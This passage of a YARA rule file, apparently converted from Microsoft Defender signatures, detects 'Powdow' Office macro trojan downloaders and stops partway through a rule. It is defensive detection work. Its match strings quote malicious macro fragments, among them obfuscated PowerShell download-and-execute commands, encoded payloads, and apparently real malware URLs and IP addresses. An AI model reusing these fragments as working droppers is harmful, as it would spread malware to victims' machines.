        $x_5_3 = {43 68 72 28 31 31 36 29 20 2b 20 43 68 72 28 31 31 32 29 20 2b 20 43 68 72 28 35 38 29 20 2b 20 43 68 72 28 34 37 29 20 2b 20 43 68 72 28 34 37 29 20 2b 20 43 68 72 28 31 30 33 29 20 2b 20 43 68 72 28 31 31 34 29 20 2b 20 43 68 72 28 31 31 31 29 20 2b 20 43 68 72 28 31 31 37 29 20 5f 0d 0a 20 2b 20 43 68 72 28 31 31 32 29 20 2b 20 43 68 72 28 31 31 35 29 20 2b 20 43 68 72 28 34 36 29 20 2b 20 43 68 72 28 31 31 37 29 20 2b 20 43 68 72 28 31 31 35 29 20 2b 20 43 68 72 28 34 36 29 20 2b 20 43 68 72 28 31 31 36 29 20 2b 20 43 68 72 28 31 31 31 29 20 2b 20 43 68 72 28 35 38 29 20 5f 0d 0a 20 2b 20 43 68 72 28 35 34 29 20 2b 20 43 68 72 28 35 37 29 20 2b 20 43 68 72 28 34 37 29 20 2b 20 43 68 72 28 31 30 30 29}  //weight: 5, accuracy: High
        $x_1_4 = "s0 (p0)" ascii //weight: 1
        $x_1_5 = "b0 = d0.Get(\"wIn32_pRoCeSs\")" ascii //weight: 1
        $x_1_6 = "GetObject(\"WiNmGmTs:{ImPeRsOnAtIoNlEvEl=ImPeRsOnAtE}!\\\\.\\RoOt\\CiMv2\")" ascii //weight: 1
        $x_1_7 = "b0.Create(n0, Null)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 4 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_RSP_2147773787_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSP!MTB"
        threat_id = "2147773787"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 77 77 2e 6f 72 61 74 6f 72 69 6f 73 74 73 75 72 75 6b 79 6f 2e 63 6f 6d 2e 62 72 2f 61 72 71 75 69 76 6f 73 2f 72 65 76 65 6e 67 65 2e 76 62 73 27 27 2c 24 65 6e 76 3a 41 50 50 44 41 54 41 2b 27 27 5c 5c 27 27 2b 27 27 61 64 6f 62 65 2e 76 62 73 27 27 29 5e 00 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "StrReverse(Chr$(108) & Chr$(108) & Chr$(101) & Chr$(104) & Chr$(115) & Chr$(114) & Chr$(101) & Chr$(119) & Chr$(111) & Chr$(80))" ascii //weight: 1
        $x_1_3 = "start-process($env:APPDATA+'\\\\'+'adobe.vbs')" ascii //weight: 1
        $x_1_4 = "objProcess.Create(junta, Null, objConfig, intProcessID)" ascii //weight: 1
        $x_1_5 = "$r='KEX'.replace('K','I')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DRE_2147773802_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DRE!MTB"
        threat_id = "2147773802"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Len(Left(yytyy, kk))" ascii //weight: 1
        $x_1_2 = "Left(yytyy, 4 - 3)" ascii //weight: 1
        $x_1_3 = "(Range(\"D101\"))" ascii //weight: 1
        $x_1_4 = "(Range(\"D100\"))" ascii //weight: 1
        $x_1_5 = ".mdlfpe(BJdhFzvBZTfWTDpJ + tLxAWUybmXvvBcgGET)" ascii //weight: 1
        $x_1_6 = "AUvrkk.Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSQ_2147773969_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSQ!MTB"
        threat_id = "2147773969"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ttp://rebrand.ly/WdBPApoMACRO" ascii //weight: 1
        $x_1_2 = {74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 34 71 32 79 34 61 66 6d 1b 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = "ll -w 1 ./a.bat" ascii //weight: 1
        $x_1_4 = "mlkjljkjlkrglkjgrfjkljgfrv" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSR_2147774138_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSR!MTB"
        threat_id = "2147774138"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cMD  /c POWerShell.EXE  -ex bYPASS -NOP -w 1 IEx( CUrL" ascii //weight: 1
        $x_1_2 = "http'  + '://45.145.185.153'  + '/File'  + 'Doc'  + '.'  + 'j'  + 'p'  + 'g'" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_CTYQ_2147774162_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.CTYQ!MTB"
        threat_id = "2147774162"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://cutt.ly/vknkmiQ" ascii //weight: 1
        $x_1_2 = "ttp://rebrand.ly/WdBPApoMACRO" ascii //weight: 1
        $x_1_3 = "(nEw-oB`jecT Ne" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DRZ_2147774399_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DRZ!MTB"
        threat_id = "2147774399"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell -enco \"\" & cmd, null, objProcessStart" ascii //weight: 1
        $x_1_2 = "Shell (\"wscript \" & url)" ascii //weight: 1
        $x_1_3 = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AZgBpAGwAZQBtAGEAbgBhAGcAZQByAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADo" ascii //weight: 1
        $x_1_4 = "AXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlADsAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAUAB1AGIAbABpAGMAXABcAGYAaQBsAGUAbQBhAG4AYQBnAGUAcgAuAGUAeABlAA==" ascii //weight: 1
        $x_1_5 = "\"C:\\\\Users\\\\Public\\\\getfonts.vbs\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RST_2147775846_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RST!MTB"
        threat_id = "2147775846"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "shell = VBA.CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "shell.Run(\"Powershell I`EX ((n`e`W`-Obj`E`c`T (('Net'+'.'+'Webc'+'lient'" ascii //weight: 1
        $x_1_3 = "D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'s'+'tri'+''+''+''+''+''+''+'" ascii //weight: 1
        $x_1_4 = "+''+'n'+'g')).InVokE((('kink'))))\", 0, False" ascii //weight: 1
        $x_1_5 = "Auto_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DRR_2147776918_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DRR!MTB"
        threat_id = "2147776918"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "6f7765727368656c6c202d77696e2068696464656e20" ascii //weight: 1
        $x_1_2 = ".Run (Full_Command)" ascii //weight: 1
        $x_1_3 = "577363726970742e53" ascii //weight: 1
        $x_1_4 = "68656c6c" ascii //weight: 1
        $x_1_5 = ".nAme[3,11,2]-joIN" ascii //weight: 1
        $x_1_6 = "CqHwuEQOD5WHrVrQYGGhrY8DUXJH9CLFZf" ascii //weight: 1
        $x_1_7 = "7u0BsdiaZb7IzC3y3ACfB98LKY8WezdmZcS" ascii //weight: 1
        $x_1_8 = ".reAdtoEnd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DRR_2147776918_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DRR!MTB"
        threat_id = "2147776918"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Mid(\"cbbfgasdas 3addas3asd2asd\", 20, 5)" ascii //weight: 1
        $x_1_2 = "RTrim(ruben)" ascii //weight: 1
        $x_1_3 = ":\\\\Loaekiejaasjeasjtheoriest" ascii //weight: 1
        $x_1_4 = "String(1, \"h\") + String(2, \"t\") + String(1, \"p\")" ascii //weight: 1
        $x_1_5 = "String(1, \"b\") + ruben2 + \"t\" + \".\" + brooms + String(1, \"y\") + \"/\" & id + \"sdf4sasd3as\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSU_2147776969_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSU!MTB"
        threat_id = "2147776969"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 77 77 2e 6d 69 6e 70 69 63 2e 64 65 2f 6b 2f 62 64 62 70 2f 31 36 67 6b 34 68 2f 27 30 00 2e 49 6e 56 6f 6b 45 28 28 28 27 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "Shell \"powershell I`EX ((n`e`W`-Obj`E`c`T (('Net'+'.'+'Webc'+'lient'" ascii //weight: 1
        $x_1_3 = "D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'s'+'tri'" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSV_2147778207_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSV!MTB"
        threat_id = "2147778207"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Service.Get(\"Win32_Pr\" + \"ocess\")" ascii //weight: 1
        $x_1_2 = "new:0D43FE01-" ascii //weight: 1
        $x_1_3 = "temppath = \"C:\\\\ProgramData\" + \"\\\\zubizuru.exe\"" ascii //weight: 1
        $x_1_4 = "$profile = $env:temp+'\\zurubatesting'" ascii //weight: 1
        $x_1_5 = {22 70 6f 77 22 0d 0a [0-10] 20 3d 20 22 65 72 73 68 65 22 0d 0a [0-10] 20 3d 20 22 6c 6c 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_6 = "errReturn = Process.Create(RunPath, Null, objConfig, ProcessID)" ascii //weight: 1
        $x_1_7 = {70 73 68 65 6c 6c 50 61 74 68 20 3d 20 22 43 3a 5c 5c 57 69 6e 64 6f 77 73 5c 5c 53 79 73 74 65 6d 33 32 5c 5c 22 20 [0-13] 20 22 5c 5c 76 31 2e 30 5c 5c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RSW_2147778661_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RSW!MTB"
        threat_id = "2147778661"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {32 45 34 34 36 46 37 37 36 45 36 43 36 46 36 31 36 34 34 36 36 39 36 43 36 35 32 38 32 37 36 38 37 34 37 34 37 30 33 41 32 46 32 46 37 33 36 35 37 36 32 45 36 44 36 39 36 43 36 35 36 45 36 32 36 31 37 41 36 39 36 45 37 33 36 42 36 39 32 45 36 44 36 35 33 41 33 32 33 30 33 39 33 35 32 46 36 31 36 32 32 46 36 31 36 34 [0-2] 32 45 36 35 37 38 36 35}  //weight: 1, accuracy: Low
        $x_1_2 = "Call Shell(ChrEncode(\"706F7765727368656C6C2E657865202D657865637574696F6E706F6C69637920627970617373202D572048696464656E" ascii //weight: 1
        $x_1_3 = "sStr + Chr(CLng(\"&H\" & Mid(str, i, 2)))" ascii //weight: 1
        $x_1_4 = "For i = 1 To Len(str) Step 2" ascii //weight: 1
        $x_1_5 = "autoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BTHA_2147779417_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BTHA!MTB"
        threat_id = "2147779417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_2 = "= \"\" & ExMemoryClear & \"\"" ascii //weight: 1
        $x_1_3 = ".exec p(getwc)" ascii //weight: 1
        $x_1_4 = "= Split(p(frm.getwc), \" \")" ascii //weight: 1
        $x_1_5 = "= \"explorer.exe c:\\programdata\\linkLenLeft.hta\"" ascii //weight: 1
        $x_1_6 = "frm.button1_Click" ascii //weight: 1
        $x_1_7 = "<html><body><div id='content'>fTtl" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BTHB_2147779438_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BTHB!MTB"
        threat_id = "2147779438"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 65 78 70 6c 6f 72 65 72 2e 65 78 65 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-18] 2e 68 74 61 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_3 = ".exec p(rm)" ascii //weight: 1
        $x_1_4 = "<html><body><div id='content'>fTtl" ascii //weight: 1
        $x_1_5 = "= Split(p(frm.rm), \" \")" ascii //weight: 1
        $x_1_6 = {66 72 6d 2e 62 75 74 74 6f 6e 31 5f 43 6c 69 63 6b 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KK_2147779572_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KK!MTB"
        threat_id = "2147779572"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"c:\\windows\\explorer.exe c:\\programdata\\listboxPasteCounter.hta\"" ascii //weight: 1
        $x_1_2 = "memIndex.exec p(rm)" ascii //weight: 1
        $x_1_3 = "= Split(p(frm.rm), \" \")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KK_2147779572_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KK!MTB"
        threat_id = "2147779572"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"c:\\windows\\explorer.exe c:\\programdata\\screenOptionTextbox.hta\"" ascii //weight: 1
        $x_1_2 = "varLoadArray.exec p(rm)" ascii //weight: 1
        $x_1_3 = "= Split(p(frm.rm), \" \")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KK_2147779572_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KK!MTB"
        threat_id = "2147779572"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".CreateObject(\"wscript.\" & she & \"l\").exec(psowerss & \"hell -w Hidden Invoke-WebRequest -Uri" ascii //weight: 1
        $x_1_2 = "http://landing.yetiapp.ec/IDx6/FLP_5012_306_171.ex" ascii //weight: 1
        $x_1_3 = "& \"C:\\Users\\Public\\Documents\\checkgirl.ex\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KK_2147779572_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KK!MTB"
        threat_id = "2147779572"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 22 20 26 20 73 68 65 29 2e 65 78 65 63 28 [0-13] 20 26 20 [0-13] 20 26 20 22 20 2d 77 20 22 20 26 20 73 65 61 73 65 20 26 20 22 20 49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69}  //weight: 1, accuracy: Low
        $x_1_2 = "http://afms.org.uk/js/mega.ex" ascii //weight: 1
        $x_1_3 = {2d 4f 75 74 46 22 20 26 20 22 69 6c 65 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 65 78}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KK_2147779572_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KK!MTB"
        threat_id = "2147779572"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".CreateObject(\"wscript.\" & she & \"l\").exec(psowerss & \"hell -w \" & sease & \"n Invoke-WebRequest -Uri" ascii //weight: 1
        $x_1_2 = "http://scaladevelopments.scaladevco.com/13Z/IMG_001263082.ex" ascii //weight: 1
        $x_1_3 = "C:\\Users\\Public\\Documents\\technologypurpose.ex\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BTHC_2147779641_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BTHC!MTB"
        threat_id = "2147779641"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_2 = "= GetObject(\"winmgmts:root\\cimv2:Win32_Process\")" ascii //weight: 1
        $x_1_3 = {2e 43 72 65 61 74 65 20 70 28 72 6d 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = "= Split(p(frm.rm), \" \")" ascii //weight: 1
        $x_1_5 = "frm.button1_Click" ascii //weight: 1
        $x_1_6 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 22 61 74 68 2e [0-48] 5c 61 74 61 64 6d 61 72 67 6f 72 70 5c 3a 63 20 65 78 65 2e 72 65 72 6f 6c 70 78 65 5c 73 77 6f 64 6e 69 77 5c 3a 63 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_CSK_2147779669_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.CSK!MTB"
        threat_id = "2147779669"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "wscript.\" & she & \"l\").exec(psowerss & \"hell" ascii //weight: 1
        $x_1_2 = {31 38 35 2e 31 31 37 2e 39 31 2e 31 39 39 2f 39 39 2f 43 6b 68 70 75 68 6c 2e 65 78 23 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = {50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 72 65 61 6c 65 78 65 63 75 74 69 76 65 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 29 37 00 43 3a 5c 55 73 65 72 73 5c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KT_2147779720_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KT!MTB"
        threat_id = "2147779720"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {65 78 70 6c 6f 72 65 72 2e 65 78 65 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-37] 2e 68 74 61 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 63 20 70 28 [0-7] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 70 28 66 72 6d 2e [0-7] 29 2c 20 22 20 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "frm.button1_Click" ascii //weight: 1
        $x_1_5 = {3d 20 52 65 70 6c 61 63 65 28 [0-25] 2c 20 [0-25] 2c 20 [0-25] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DRT_2147780273_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DRT!MTB"
        threat_id = "2147780273"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".exec(psowerss & \"hell -w Hidden Invoke-WebRequest -Uri" ascii //weight: 1
        $x_1_2 = {55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 69 73 73 75 65 70 6f 6c 69 74 69 63 61 6c 2e 65 78 2b 00 43 3a 5c}  //weight: 1, accuracy: Low
        $x_1_3 = "recentlyanalysis.CreateObject(\"wscript.\" & she & \"l\")" ascii //weight: 1
        $x_1_4 = {69 6b 6c 61 6e 67 72 61 74 69 73 73 75 72 61 62 61 79 61 2e 73 6b 6f 6d 2e 69 64 2f 7a 78 2f 46 73 62 65 79 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 3a 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVA_2147780290_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVA!MTB"
        threat_id = "2147780290"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"wscript.\" & she & \"l\").exec(psowerss & \"hell -w" ascii //weight: 1
